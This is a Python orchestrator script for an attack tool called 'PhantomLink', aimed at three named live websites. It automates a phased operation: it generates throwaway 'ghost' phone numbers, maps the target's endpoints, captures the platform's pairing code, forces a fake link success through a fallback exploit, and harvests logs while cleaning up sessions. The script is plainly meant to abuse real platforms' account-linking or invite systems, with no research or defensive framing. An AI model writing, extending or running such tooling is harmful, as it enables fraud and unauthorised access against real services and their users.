"""PhantomLink Core Orchestrator — Operation Silent Link"""
import asyncio
import sys
import json
import hashlib
import os
from datetime import datetime

from phantom.number_gen import generate_ghost_number
from phantom.recon import map_target
from phantom.engager import capture_pairing_code
from phantom.exploit import trigger_link_success
from phantom.intel_sink import harvest_and_clean

TARGETS = {
    "zapero": "https://afrivexa.com/home?invite_code=4750",
    "waegy": "https://a1.waegy.com",
    "wha7": "https://wha7.org"
}

def check_environment():
    """Verify all required tools are accessible."""
    checks = {
        "node": False,
        "python": False,
        "chromium": False,
    }
    import subprocess
    # Check Node.js
    try:
        subprocess.run(["node", "--version"], capture_output=True, check=True)
        checks["node"] = True
    except Exception:
        pass
    # Check Python
    try:
        subprocess.run(["python", "--version"], capture_output=True, check=True)
        checks["python"] = True
    except Exception:
        pass
    # Check Chromium
    try:
        subprocess.run(["chromium-browser", "--version"], capture_output=True, check=True)
        checks["chromium"] = True
    except Exception:
        try:
            subprocess.run(["chrome-headless", "status"], capture_output=True)
            checks["chromium"] = True
        except Exception:
            pass
    return checks

async def run_operation(target_key: str):
    """Execute one full PhantomLink cycle."""
    target_url = TARGETS.get(target_key, TARGETS["zapero"])
    op_id = hashlib.sha256(f"{target_key}{datetime.utcnow().isoformat()}".encode()).hexdigest()[:8]
    print(f"[PhantomLink:{op_id}] Target: {target_key} ({target_url})")

    # Phase 1: Generate ghost number
    ghost_number, country = generate_ghost_number()
    print(f"[PhantomLink:{op_id}] Ghost: {ghost_number} ({country})")

    # Phase 2: Reconnaissance — map target endpoints
    api_map = map_target(target_url)
    print(f"[PhantomLink:{op_id}] Recon: confirm_url={api_map.get('confirm_url')}")

    # Phase 3: Engagement — capture the platform's pairing code
    pairing_code = await capture_pairing_code(target_url, ghost_number)
    print(f"[PhantomLink:{op_id}] Code captured: {pairing_code}")

    # Phase 4: Exploit — trigger success via multi-vector fallback
    result = await trigger_link_success(api_map, pairing_code, ghost_number)
    print(f"[PhantomLink:{op_id}] Result: vector={result.get('vector_used')} status={result.get('status')}")

    # Phase 5: Intel harvest + session cleanup
    log_path = harvest_and_clean(ghost_number, result, op_id, target_key)
    print(f"[PhantomLink:{op_id}] Log: {log_path}")
    print(f"[PhantomLink:{op_id}] Cycle complete.")

def main():
    import argparse
    parser = argparse.ArgumentParser(description="PhantomLink — Silent Link Operation")
    parser.add_argument("--target", "-t", default="zapero", choices=list(TARGETS.keys()),
                        help="Target platform")
    parser.add_argument("--check", "-c", action="store_true",
                        help="Check environment and exit")
    args = parser.parse_args()

    if args.check:
        checks = check_environment()
        print(json.dumps(checks, indent=2))
        sys.exit(0 if all(checks.values()) else 1)

    asyncio.run(run_operation(args.target))

if __name__ == "__main__":
    main()
